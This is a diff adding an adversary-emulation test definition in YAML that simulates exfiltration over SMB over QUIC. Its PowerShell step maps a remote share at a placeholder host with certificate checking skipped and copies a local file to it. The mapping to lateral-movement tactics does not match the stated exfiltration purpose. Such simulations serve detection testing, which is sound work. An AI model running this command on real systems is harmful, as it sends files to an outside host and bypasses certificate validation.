@@ -1,0 +1,33 @@
+api_version: "2.0"
+name: Exfiltration Over SMB over QUIC (New-SmbMapping)
+description: |
+    Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
+    Prerequisites:
+      - A file server running Windows Server 2022 Datacenter: Azure Edition
+      - A Windows 11 computer
+      - Windows Admin Center
+args:
+    - name: remote_path
+      type: string
+      default: \\example.com\sales
+    - name: local_file
+      type: path
+      default: C:\path\to\file.txt
+uuid: d8d13303-159e-4f33-89f4-9f07812d016f
+mitre:
+    tactics:
+        - 'TA0008: Lateral Movement'
+    techniques:
+        - 'T1570: Lateral Tool Transfer'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: exfiltration-over-smb-over-quic-(new-smbmapping)
+      inline: |
+        New-SmbMapping -RemotePath '{{.Args.remote_path}}' -TransportType QUIC -SkipCertificateCheck
+        copy '{{.Args.local_file}}' 'Z:\'
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
